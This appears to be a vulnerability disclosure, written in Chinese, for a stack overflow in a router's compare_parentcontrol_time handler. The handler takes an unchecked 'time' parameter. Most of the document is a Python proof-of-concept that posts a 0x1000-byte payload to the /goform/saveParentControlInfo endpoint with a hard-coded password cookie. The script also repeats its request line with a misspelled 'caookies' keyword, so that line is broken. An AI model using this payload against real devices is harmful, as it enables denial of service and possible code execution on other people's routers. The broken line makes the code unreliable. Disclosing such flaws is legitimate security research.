在函数compare_parentcontrol_time中，程序从参数“time”中获取的内容传递给程序创建的变量s，通过scanf传递变量的值。 没有大小检查，因此存在堆栈溢出漏洞。攻击者可以使用精心设计的溢出数据轻松执行任意代码或造成拒绝服务攻击。

<img width="415" height="340" alt="image" src="https://github.com/user-attachments/assets/735b5a28-39eb-457f-a592-c93279d0a65c" />


POC：
```
from pwn import *
import requests

payload = b'a'*0x1000

url = "http://192.168.100.254/goform/saveParentControlInfo"

cookie = {"Cookie":"password=12345"}
data = {"time": payload}
response = requests.post(url, cookies=cookie, data=data)
response = requests.post(url, caookies=cookie, data=data)
print(response.text)
```
